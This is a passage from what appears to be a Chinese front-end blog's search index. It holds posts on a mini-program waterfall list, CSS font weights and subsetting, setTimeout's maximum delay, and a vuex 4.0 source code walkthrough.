punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>loadDataComponent<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><p>通过获取组件 <code>ref</code>， 调用组件内部的 <code>getData</code> 方法，反射到主页面的<code>getListData</code>实现数据获取。<br>在通过 slot 的 slot-scope 获取需要展示的 list 数据，外部进行遍历并设置样式。<br>何时加载数据，由外部实现和决定，组件本身不会主动去请求数据。</p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><ol><li>本文小程序指的是支付宝小程序，微信小程序好像并没有 slot-scope 功能</li><li>框架使用 herbjs </li></ol><p>完整代码：<br><a href="https://github.com/Yaob1990/mini-alipay-example/tree/main/src/components/waterflow-list" target="_blank" rel="noopener">mini-alipay-example/src/components/waterflow-list at main · Yaob1990/mini-alipay-example</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端 font 优化</title>
      <link href="/2021/04/11/front-end/font/"/>
      <url>/2021/04/11/front-end/font/</url>
      
        <content type="html"><![CDATA[<p>开发中，一般直接引入字体，使用即可，似乎字体本身并没有很多可以说道的地方，其实不然。字体本身涉及到印刷工业，是一个历史悠久的行业，css 字体的大部分属性都可以在印刷工业中找到映射。这篇博客，整理常见的字体使用细节。</p><h2 id="衬线体和非衬线体"><a href="#衬线体和非衬线体" class="headerlink" title="衬线体和非衬线体"></a>衬线体和非衬线体</h2><p>衬线体（英语：Serif）是一种有衬线的字体，又称为有衬线体、衬线字、曲线描边字，俗称白体字；而与之相对的，没有衬线的字体则被称为无衬线体。衬线是字形笔画的起始段与末端的装饰细节部分。<br>一般的 web 开发都倾向于无衬线体，我们在定义字体时候，应该设置完整的字体属性，衬线体或者非衬线体结尾。</p><pre class=" language-css"><code class="language-css"><span class="token selector">// 谷歌的字体设置p </span><span class="token punctuation">{</span>   <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Roboto'</span>,arial,sans-serif<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/16181269068142.jpg"></p><h2 id="字重"><a href="#字重" class="headerlink" title="字重"></a>字重</h2><h3 id="字重和字体名称的关系"><a href="#字重和字体名称的关系" class="headerlink" title="字重和字体名称的关系"></a>字重和字体名称的关系</h3><p>我们经常在设计稿重看到 <code>PingFangSC-Regular</code>、<code>PingFangSC-Medium</code>、<code>PingFangSC-Semibold</code> 这些字体，是3个字体吗，那么这些字体在css中应该怎么写？当成独立字体直接写，好像也没有问题，也可以解析。</p><p>但是这样，似乎是有点问题的，这些字体属于平方字体，只不过是不同的字重而已。我们直接写 <code>PingFangSC</code> 然后设置字重就可以了。</p><p>如果只是写 <code>PingFangSC-Medium</code>，不设置字重，其实也是无法生效的，会显示默认字重，也就是 <code>PingFangSC-Regular</code>。</p><p>进一步，我们为什么需要写 <code>PingFangSC</code> 字体，这个字体是苹果系统默认的中文字体。所以，设计稿是平方字体的时候，直接写 <code>font-weight</code> 好了。</p><h3 id="字体包的使用"><a href="#字体包的使用" class="headerlink" title="字体包的使用"></a>字体包的使用</h3><blockquote><p>NotoSansSC 字体<br>NotoSansSC-Thin.otf<br>NotoSansSC-Light.otf<br>NotoSansSC-Regular.otf<br>NotoSansSC-Medium.otf<br>NotoSansSC-Bold.otf<br>NotoSansSC-Black.otf</p></blockquote><p>现代字体往往会提供多种自重，相对于以往的 css bolder 会更加的精细，写法如下：</p><pre class=" language-css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span><span class="token punctuation">;</span>    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span><span class="token string">'./NotoSansSC-Thin.otf'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span><span class="token punctuation">;</span>    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span><span class="token string">'./NotoSansSC-Light.otf'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span><span class="token punctuation">;</span>    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">400</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span><span class="token string">'./NotoSansSC-Regular.otf'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span><span class="token punctuation">;</span>    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span><span class="token string">'./NotoSansSC-Medium.otf'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span><span class="token punctuation">;</span>    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">700</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span><span class="token string">'./NotoSansSC-Bold.otf'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span><span class="token punctuation">;</span>    <span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">900</span><span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span><span class="token string">'./NotoSansSC-Black.otf'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>使用：</p><pre class=" language-css"><code class="language-css"><span class="token selector">p </span><span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Noto Sans SC'</span>, sans-serif<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">900</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="常见计稿字体对应字重font-weight"><a href="#常见计稿字体对应字重font-weight" class="headerlink" title="常见计稿字体对应字重font-weight"></a>常见计稿字体对应字重font-weight</h3><ul><li>100 - Thin</li><li>200 - Extra Light (Ultra Light)</li><li>300 - Light</li><li>400 - Regular (Normal、Book、Roman)</li><li>500 - Medium</li><li>600 - Semi Bold (Demi Bold)</li><li>700 - Bold</li><li>800 - Extra Bold (Ultra Bold)</li><li>900 - Black (Heavy)</li></ul><h2 id="字体裁切"><a href="#字体裁切" class="headerlink" title="字体裁切"></a>字体裁切</h2><p>因为中文字体都比较大，一般都需要使用webfont等方式缩小字体大小。</p><h3 id="字蛛"><a href="#字蛛" class="headerlink" title="字蛛"></a>字蛛</h3><p>字蛛的使用限制：</p><ol><li>静态渲染内容</li><li>字体必须是 ttf 类型</li></ol><p>字体可以理解成是一种图片，裁切，保留需要用到的字符。<br>使用比较简单，把需要用到的中文写到 html 中，运行字蛛的命令即可得到需要的字符。</p><h3 id="google-font"><a href="#google-font" class="headerlink" title="google font"></a>google font</h3><p>谷歌字体的引用地址是可以使用的：<a href="https://fonts.gstatic.com/" target="_blank" rel="noopener">使用地址</a><br><img src="/images/16181293778639.jpg"></p><p>在谷歌网站上面选择相关字体，引入到项目中即可。</p><p>原理：<br>谷歌字体把中文做了分区处理，根据使用到的字符，加载相应部分，使用的时候一般 20kb 加载多条。</p><p><img src="/images/16181294659403.jpg" alt="字体分区"></p><h3 id="补充记录"><a href="#补充记录" class="headerlink" title="补充记录"></a>补充记录</h3><p>在项目里，用到了谷歌思源字体中文字体，但是谷歌只提供了 otf 格式，好不容易找到 ttf 格式，转换之后，发现某些情况下字体的行高不对，导致无法居中。<br>考虑到谷歌字体国内加载慢，把文本写入html文件，然后加载谷歌字体，在网络请求中获取实际加载的字体文件，然后加载这部分字体。<br>好麻烦….</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zh.wikipedia.org/wiki/%E8%A1%AC%E7%BA%BF%E4%BD%93" target="_blank" rel="noopener">衬线体 - 维基百科，自由的百科全书</a></li><li><a href="https://github.com/o2team/H5Skills/issues/14" target="_blank" rel="noopener">前端css字体调研 · Issue #14 · o2team/H5Skills</a></li><li><a href="https://github.com/aui/font-spider" target="_blank" rel="noopener">aui/font-spider: Smart webfont compression and format conversion tool</a></li><li><a href="https://fonts.google.com/" target="_blank" rel="noopener">Browse Fonts - Google Fonts</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js 中 setTimeout 计时器最大值</title>
      <link href="/2021/03/23/front-end/settimeout/"/>
      <url>/2021/03/23/front-end/settimeout/</url>
      
        <content type="html"><![CDATA[<p>项目中踩坑，记录下。<br>没有意识到 <code>setTimeout/setInterval</code> 计时器有最大值问题。</p><pre class=" language-js"><code class="language-js"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">31</span><span class="token punctuation">)</span></code></pre><p>这部分代码，不会等到计时器结束，而是会被会被立即执行。</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>setTimeout/setInterval 使用 <code>int32</code> 存储延时参数值，也就是说最大延时值是 <code>2^31-1</code>(约为24.85天) ，超过这个值会被立即执行。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>在 web 页面中很少有需要这么大延时值得情况，根据业务场景，超过1小时，不做定时器设置，1小时以内，做定时器设置。</p><h3 id="node"><a href="#node" class="headerlink" title="node"></a>node</h3><p>服务端，确实有类似的情况，比如1月一次的定时任务。建议使用 <code>corn</code> 代替 <code>setTimeout</code>，也会比 <code>setTimeout</code> 更加准确。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vuex 4.0 源码解析</title>
      <link href="/2021/03/10/front-end/vuex-4.0-source/"/>
      <url>/2021/03/10/front-end/vuex-4.0-source/</url>
      
        <content type="html"><![CDATA[<p>vuex 源码短小精悍，很短时间就可以大致浏览一遍，值得学习。在后续看其他框架的过程中，也发现很多框架都有参考 vuex（比如 herbjs 的插件体系）。</p><h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><ol><li>一定有一个地方集中存放所有的数据（state），可以挂载到 window 上面（污染全局），或者挂载到 vue 的原型上面。</li><li>mutation action getter 这些方法，其实都是获取或者修改 state 的值，这些方法和 state 刚好可以组成一个 类（class），类封装对 state 状态的操作。</li></ol><h2 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h2><p>4.0 版本适配了 composition api，提供了导出方法 createStore，通过它可以创建 store。<br>源码：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> createStore <span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Store</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>可以看到，这里只是简单的对 store 进行了一次 new 操作，返回了 store 这个类。<br>进一步查看，我们看到 install 方法，通过暴露install方法，按照 vue3 的插件规则进行安装，也就是挂载到了 vue3 的原型上面。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Store</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 暴露给 vue3 进行安装</span>  install <span class="token punctuation">(</span>app<span class="token punctuation">,</span> injectKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>    app<span class="token punctuation">.</span><span class="token function">provide</span><span class="token punctuation">(</span>injectKey <span class="token operator">||</span> storeKey<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>globalProperties<span class="token punctuation">.</span>$store <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="store-初始化"><a href="#store-初始化" class="headerlink" title="store 初始化"></a>store 初始化</h2><pre class=" language-js"><code class="language-js">constructor <span class="token punctuation">(</span>options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webpack.DefinePlugin 配置</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>__DEV__<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">assert</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> Promise <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`vuex requires a Promise polyfill in this browser.`</span></span><span class="token punctuation">)</span>      <span class="token function">assert</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">Store</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`store must be called with the new operator.`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span>      plugins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token comment" spellcheck="true">//  严格模式，不允许在生产环境下开启，会导致性能损失</span>      strict <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span> <span class="token operator">=</span> options    <span class="token comment" spellcheck="true">// store internal state</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_committing <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_actions <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_actionSubscribers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_mutations <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_wrappedGetters <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_modules <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModuleCollection</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_modulesNamespaceMap <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_subscribers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_makeLocalGettersCache <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// bind commit and dispatch to self</span>    <span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> dispatch<span class="token punctuation">,</span> commit <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token comment" spellcheck="true">// 绑定 dispatch 指向自己</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>dispatch <span class="token operator">=</span> <span class="token keyword">function</span> boundDispatch <span class="token punctuation">(</span>type<span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> dispatch<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>store<span class="token punctuation">,</span> type<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>commit <span class="token operator">=</span> <span class="token keyword">function</span> boundCommit <span class="token punctuation">(</span>type<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> commit<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>store<span class="token punctuation">,</span> type<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> options<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// strict mode</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>strict <span class="token operator">=</span> strict    <span class="token comment" spellcheck="true">// 定义 根state</span>    <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_modules<span class="token punctuation">.</span>root<span class="token punctuation">.</span>state    <span class="token comment" spellcheck="true">// init root module.</span>    <span class="token comment" spellcheck="true">// this also recursively registers all sub-modules</span>    <span class="token comment" spellcheck="true">// and collects all module getters inside this._wrappedGetters</span>    <span class="token comment" spellcheck="true">// 模块入口，内部注册模块，注册子模块</span>    <span class="token function">installModule</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> state<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_modules<span class="token punctuation">.</span>root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// initialize the store state, which is responsible for the reactivity</span>    <span class="token comment" spellcheck="true">// (also registers _wrappedGetters as computed properties)</span>    <span class="token comment" spellcheck="true">// 初始化 state</span>    <span class="token function">resetStoreState</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// apply plugins</span>    <span class="token comment" spellcheck="true">// 一般都是通过 store.subscribe 进行订阅，在 mutation 之后执行</span>    plugins<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>plugin <span class="token operator">=</span><span class="token operator">></span> <span class="token function">plugin</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> useDevtools <span class="token operator">=</span> options<span class="token punctuation">.</span>devtools <span class="token operator">!==</span> undefined <span class="token operator">?</span> options<span class="token punctuation">.</span>devtools <span class="token punctuation">:</span> <span class="token comment" spellcheck="true">/* Vue.config.devtools */</span> <span class="token boolean">true</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>useDevtools<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">devtoolPlugin</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>在构造函数中，定义了一系列的参数，参数内容基本都是纯粹空 object（Object.create(null)），可以理解成在构造函数中，对所有的 commit，dispatch等进行了一次收集，触发时候，直接从这边取。<br>dispatch commit，是外界直接调用的函数，一般使用方式<code>this.$store.dispatch(&#39;increment&#39;,5);</code>,为了确保指向store本身，这里用 <code>call</code> 做了一次 this 绑定，否则这里就会指向了 <code>this</code> 也就是 vue 本身了。</p><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><pre class=" language-js"><code class="language-js">commit <span class="token punctuation">(</span>_type<span class="token punctuation">,</span> _payload<span class="token punctuation">,</span> _options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// check object-style commit</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span>      type<span class="token punctuation">,</span>      payload<span class="token punctuation">,</span>      options    <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">unifyObjectStyle</span><span class="token punctuation">(</span>_type<span class="token punctuation">,</span> _payload<span class="token punctuation">,</span> _options<span class="token punctuation">)</span>    <span class="token keyword">const</span> mutation <span class="token operator">=</span> <span class="token punctuation">{</span> type<span class="token punctuation">,</span> payload <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 取出对应的 mutations</span>    <span class="token keyword">const</span> entry <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_mutations<span class="token punctuation">[</span>type<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>entry<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 没有entry，开发模式报错</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>__DEV__<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`[vuex] unknown mutation type: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>type<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_withCommit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 执行entry，这里为啥用 foreach，会存在 entry 数组的情况？</span>      <span class="token comment" spellcheck="true">// 测试之后，这里应该只有1个数组内容的情况，不会出现多个数组元素</span>      entry<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> commitIterator <span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">handler</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span></code></pre><p>  commit 部分看起来比较简单，通过函数参数获取 type、payload、options、，取出mutation，执行mutation。<br>  这里有个疑问，为什么entry是forEach执行的，这里一般情况下，应该entry内部只有一个元素,[mutation]，这样的形式。</p><pre class=" language-js"><code class="language-js">entry<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> commitIterator <span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">handler</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="dispatch"><a href="#dispatch" class="headerlink" title="dispatch"></a>dispatch</h2><pre class=" language-js"><code class="language-js"><span class="token function">dispatch</span><span class="token punctuation">(</span>_type<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// check object-style dispatch</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span>    type<span class="token punctuation">,</span>    payload  <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">unifyObjectStyle</span><span class="token punctuation">(</span>_type<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>  <span class="token keyword">const</span> action <span class="token operator">=</span> <span class="token punctuation">{</span> type<span class="token punctuation">,</span> payload <span class="token punctuation">}</span>  <span class="token keyword">const</span> entry <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_actions<span class="token punctuation">[</span>type<span class="token punctuation">]</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// before</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_actionSubscribers      <span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// shallow copy to prevent iterator invalidation if subscriber synchronously calls unsubscribe</span>      <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> sub<span class="token punctuation">.</span>before<span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> sub<span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span>  <span class="token keyword">const</span> result <span class="token operator">=</span> entry<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span>    <span class="token operator">?</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>handler <span class="token operator">=</span><span class="token operator">></span> <span class="token function">handler</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">:</span> entry<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// dispatch 最终返回的是一个 promise</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    result<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// after</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_actionSubscribers          <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> sub<span class="token punctuation">.</span>after<span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> sub<span class="token punctuation">.</span><span class="token function">after</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">}</span>      <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_actionSubscribers          <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> sub<span class="token punctuation">.</span>error<span class="token punctuation">)</span>          <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> sub<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token 